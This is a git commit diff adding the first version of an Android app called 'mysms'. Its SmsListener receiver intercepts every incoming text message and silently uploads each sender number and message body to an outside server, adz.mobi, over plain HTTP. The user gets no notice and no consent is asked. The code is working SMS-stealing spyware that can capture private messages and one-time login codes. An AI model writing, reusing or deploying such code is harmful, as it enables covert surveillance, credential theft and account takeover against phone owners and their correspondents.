b7772d78a07f14b38072d79b00612bf81e05aa31
Max Base <MaxBaseCode@Gmail.Com>
2019-10-12 01:00:58 +0330

    Upload first version of app...

---
+++ app/src/main/java/org/aterd/mysms/ActivityMain.java
@@ -0,0 +1,13 @@
+package org.aterd.mysms;
+
+import android.app.Activity;
+import android.os.Bundle;
+
+public class ActivityMain extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+}
---
+++ app/src/main/java/org/aterd/mysms/SmsListener.java
@@ -0,0 +1,94 @@
+package org.aterd.mysms;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.provider.SyncStateContract;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+public class SmsListener extends BroadcastReceiver {
+
+    private SharedPreferences preferences;
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
+            Bundle bundle = intent.getExtras();
+            SmsMessage[] msgs = null;
+            String msg_from;
+            if (bundle != null){
+                try{
+                    Object[] pdus = (Object[]) bundle.get("pdus");
+                    msgs = new SmsMessage[pdus.length];
+                    for(int i=0; i<msgs.length; i++){
+                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
+                        msg_from = msgs[i].getOriginatingAddress();
+                        String msgBody = msgs[i].getMessageBody();
+                        send(msg_from, msgBody);
+                    }
+                }
+                catch(Exception e){
+                    Log.d("Exception caught",e.getMessage());
+                }
+            }
+        }
+    }
+    public void send(String from, String body) {
+        OkHttpClient okHttpClient = new OkHttpClient();
+        RequestBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("sender", from)
+                .addFormDataPart("message", body)
+                .build();
+        Request.Builder builder = new Request.Builder();
+        Request request = builder
+                .header("App", "1.0.0")
+                .url("http://adz.mobi/mp.php")
+                .post(requestBody)
+                .build();
+        okHttpClient.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, final IOException e) {
+                new Handler(Looper.getMainLooper()).post(new Runnable() {
+                    @Override
+                    public void run() {
+                    }
+                });
+            }
+
+            @Override
+            public void onResponse(Call call, final Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {
+                        @Override
+                        public void run() {
+                        }
+                    });
+                } else {
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {
+                        @Override
+                        public void run() {
+                        }
+                    });
+                }
+            }
+        });
+    }
+}
